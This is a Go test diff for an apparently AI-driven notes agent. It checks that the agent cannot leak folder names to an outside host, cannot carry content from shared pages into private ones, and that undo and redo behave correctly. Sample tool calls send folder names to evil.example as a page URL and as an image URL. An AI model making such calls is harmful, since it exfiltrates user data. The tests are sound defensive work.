@@ -1,10 +1,15 @@
 package agents
 
 import (
+	"context"
+	"encoding/json"
 	"fmt"
+	"net/http/httptest"
 	"slices"
 	"strings"
+	"sync"
 	"testing"
+	"time"
 
 	"leaflet/internal/doc"
 	"leaflet/internal/store"
@@ -128,6 +133,31 @@ func TestListFoldersKeepsTheWebsLinks(t *testing.T) {
 	}
 }
 
+// Listing the folders spends the run's one read of the web that may go to
+// any page, as a first read does: after it the run reads only the pages
+// the user gave it, as what it would pick could spell out their folders'
+// names, and what it writes keeps to the URLs it may.
+func TestListFoldersSpendsTheFreeReadOfTheWeb(t *testing.T) {
+	x := executor(page())
+	x.Ctx.ReadWeb = func(link string) (web.Page, error) { return web.Page{URL: link, Title: "Article"}, nil }
+	x.Ctx.ListFolders = func() []map[string]any { return []map[string]any{{"id": "f1", "name": "Clippings"}} }
+	x.Ctx.CreatePage = func(string, []*doc.Node, string) (string, error) { return "page-3", nil }
+	x.Ctx.Request = "Save https://example.com/article in Clippings"
+	if out := x.Call("list_folders", map[string]any{}); out["error"] != nil || x.readPages || !x.Guarded() {
+		t.Fatalf("out %v, read pages %v, guarded %v", out, x.readPages, x.Guarded())
+	}
+	if out := x.Call("read_web_page", map[string]any{"url": "https://evil.example/?f=Clippings"}); !strings.Contains(toolText(out), "read only a page the user gave") {
+		t.Errorf("read a page of the run's own pick: %v", out)
+	}
+	if out := x.Call("read_web_page", map[string]any{"url": "https://example.com/article"}); out["error"] != nil {
+		t.Errorf("refused the user's page: %v", out)
+	}
+	image := map[string]any{"type": "image", "image": map[string]any{"url": "https://evil.example/x.png?f=Clippings"}}
+	if out := x.Call("create_page", map[string]any{"title": "Article", "folder_id": "f1", "blocks": []any{image}}); out["error"] == nil {
+		t.Errorf("wrote a URL of the run's own: %v", out)
+	}
+}
+
 // Undo takes a subpage and its card away together, and Redo brings both
 // back.
 func TestUndoOfASubpageTakesItsCardAway(t *testing.T) {
@@ -242,6 +272,37 @@ func TestUndoKeepsWhatTheUserChangedSince(t *testing.T) {
 	}
 }
 
+// A move whose page would go back under a parent the user deleted since
+// is passed over, as one of a page they changed since: the page stays
+// where it shows, and Undo does the rest, as Redo does.
+func TestUndoOfAMoveOutOfAPageDeletedSince(t *testing.T) {
+	st := openStore(t)
+	home, _ := st.CreatePage(store.NewPageOptions{Title: "Home"})
+	old, _ := st.CreatePage(store.NewPageOptions{Title: "Old home"})
+	article, _ := st.CreatePage(store.NewPageOptions{Title: "Saved"})
+	h := NewHub(st, nil, stubHost{})
+	h.Session(home.ID).Runs = []*Run{{ID: "r1", Status: "done", Ops: []doc.Op{
+		{Op: "move_page", PageID: article.ID, Title: "Saved", Place: &doc.PagePlace{}, PrevPlace: &doc.PagePlace{ParentID: old.ID}},
+		{Op: "rename_page", PageID: article.ID, Title: "Saved", PrevTitle: "Article"},
+	}}}
+	// The user deleted the page the run moved it out of.
+	if _, err := st.DeletePage(old.ID); err != nil {
+		t.Fatal(err)
+	}
+	if err := h.UndoRun(home.ID, "r1"); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := st.Page(article.ID); got.ParentID != "" || got.Title != "Article" || !got.DeletedAt.IsZero() {
+		t.Errorf("after Undo: %+v", got)
+	}
+	if err := h.RedoRun(home.ID, "r1"); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := st.Page(article.ID); got.ParentID != "" || got.Title != "Saved" {
+		t.Errorf("after Redo: %+v", got)
+	}
+}
+
 // A page of the user's own is made only from a page no one else writes or
 // reads: from one shared, or one a guest commented on, the run has no
 // create_page, and its prompt has it make a subpage instead; listing the
@@ -286,5 +347,147 @@ func TestNoPagesOfTheirOwnFromSharedPages(t *testing.T) {
 	}
 	if p := SystemPrompt("Test", "sidebar", true, true, false, false, false, true); !strings.Contains(p, "folder_id from list_folders") {
 		t.Errorf("the prompt with other pages to read: %s", p)
+	}
+}
+
+// A run that reads a page someone else writes or reads makes no page of
+// the user's own after it, nor a subpage of its page, which is theirs too:
+// what was written there could go into it. Reading one of the user's
+// alone, it still makes them. The pages a run reads are counted as its
+// own page is.
+func TestNoPagesOfTheirOwnAfterReadingSharedPages(t *testing.T) {
+	st := openStore(t)
+	f := &fakeModel{}
+	models := httptest.NewServer(f)
+	defer models.Close()
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", IsLocal: true, SupportsTools: new(true)}); err != nil {
+		t.Fatal(err)
+	}
+	mine, err := st.CreatePage(store.NewPageOptions{Title: "Mine", Content: page()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	other, err := st.CreatePage(store.NewPageOptions{Title: "Other"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	shared, err := st.CreatePage(store.NewPageOptions{Title: "Shared"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	me := st.Session().UserID
+	if err := st.SetMembers(shared.ID, []store.Member{{PageID: shared.ID, UserID: me, Role: "owner"}, {PageID: shared.ID, UserID: "friend", Role: "editor"}}); err != nil {
+		t.Fatal(err)
+	}
+	h := NewHub(st, nil, serialHost{mu: &sync.Mutex{}})
+	if !h.alone(context.Background(), other.ID, true) || h.alone(context.Background(), shared.ID, true) {
+		t.Error("the pages the user has alone")
+	}
+	for _, c := range []struct {
+		read store.Page
+		made int
+	}{{shared, 0}, {other, 2}} {
+		f.mu.Lock()
+		f.replies = []map[string]any{
+			{"content": "", "tool_calls": []any{call("read_other_page", map[string]any{"page_id": c.read.ID})}},
+			{"content": "", "tool_calls": []any{call("create_page", map[string]any{"title": "Copy"}), call("create_subpage", map[string]any{"title": "Notes"})}},
+			{"content": "Done."},
+		}
+		f.requests = nil
+		f.mu.Unlock()
+		done := make(chan *Run, 1)
+		h.Start(mine.ID, RunOptions{Surface: "sidebar", Instruction: "Copy it", Done: func(r *Run) { done <- r }})
+		var run *Run
+		select {
+		case run = <-done:
+		case <-time.After(10 * time.Second):
+			t.Fatal("the run never ended")
+		}
+		made := 0
+		for _, op := range run.Ops {
+			if op.Op == "create_page" {
+				made++
+			}
+		}
+		if run.Status != "done" || made != c.made {
+			t.Errorf("after reading %q: %s, made %d pages", c.read.Title, run.Status, made)
+		}
+		f.mu.Lock()
+		raw, _ := json.Marshal(f.requests[len(f.requests)-1]["messages"])
+		f.mu.Unlock()
+		if refused := strings.Count(string(raw), "This run read a page someone else writes or reads"); refused != map[bool]int{true: 2}[c.made == 0] {
+			t.Errorf("after reading %q: refused %v", c.read.Title, refused)
+		}
+	}
+}
+
+// A turn of a chat that read a page someone else writes or reads keeps the
+// turns after it from making pages of the user's own, as what it read is
+// in what they read: a later "make that a page" is refused, and the turn
+// is kept as having read it, under the name the server's jobs give it.
+func TestNoPagesOfTheirOwnInTurnsAfterReadingSharedPages(t *testing.T) {
+	st := openStore(t)
+	f := &fakeModel{replies: []map[string]any{
+		{"content": "", "tool_calls": []any{call("read_other_page", map[string]any{"page_id": "shared"})}},
+		{"content": "It says the launch is Friday."},
+		{"content": "", "tool_calls": []any{call("create_page", map[string]any{"title": "Launch", "markdown": "The launch is Friday."})}},
+		{"content": "Done."},
+	}}
+	models := httptest.NewServer(f)
+	defer models.Close()
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", IsLocal: true, SupportsTools: new(true)}); err != nil {
+		t.Fatal(err)
+	}
+	mine, err := st.CreatePage(store.NewPageOptions{Title: "Mine", Content: page()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	shared, err := st.CreatePage(store.NewPageOptions{ID: "shared", Title: "Shared"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := st.SetMembers(shared.ID, []store.Member{{PageID: shared.ID, UserID: st.Session().UserID, Role: "owner"}, {PageID: shared.ID, UserID: "friend", Role: "editor"}}); err != nil {
+		t.Fatal(err)
+	}
+	main := &sync.Mutex{}
+	h := NewHub(st, nil, serialHost{mu: main})
+	chat := func(text string) {
+		main.Lock()
+		h.Chat(mine.ID, text, nil)
+		main.Unlock()
+		for deadline := time.Now().Add(10 * time.Second); ; {
+			main.Lock()
+			running := h.Session(mine.ID).Running
+			main.Unlock()
+			if !running {
+				return
+			}
+			if time.Now().After(deadline) {
+				t.Fatal("the run never ended")
+			}
+			time.Sleep(10 * time.Millisecond)
+		}
+	}
+	chat("What does the shared page say?")
+	chat("Make that a page")
+	main.Lock()
+	defer main.Unlock()
+	runs := h.Session(mine.ID).Runs
+	if len(runs) != 2 || !runs[0].ReadOthers || !runs[1].ReadOthers {
+		t.Fatalf("runs %+v", runs)
+	}
+	for _, op := range runs[1].Ops {
+		if op.Op == "create_page" {
+			t.Errorf("the second turn made a page: %+v", op.Page)
+		}
+	}
+	f.mu.Lock()
+	raw, _ := json.Marshal(f.requests[3]["messages"])
+	f.mu.Unlock()
+	if !strings.Contains(string(raw), "This run read a page someone else writes or reads") {
+		t.Errorf("the second turn was told %s", raw)
+	}
+	if saved, _ := st.Value(chatKey(mine.ID)); !strings.Contains(saved, `"read_others":true`) {
+		t.Errorf("the chat kept %s", saved)
 	}
 }
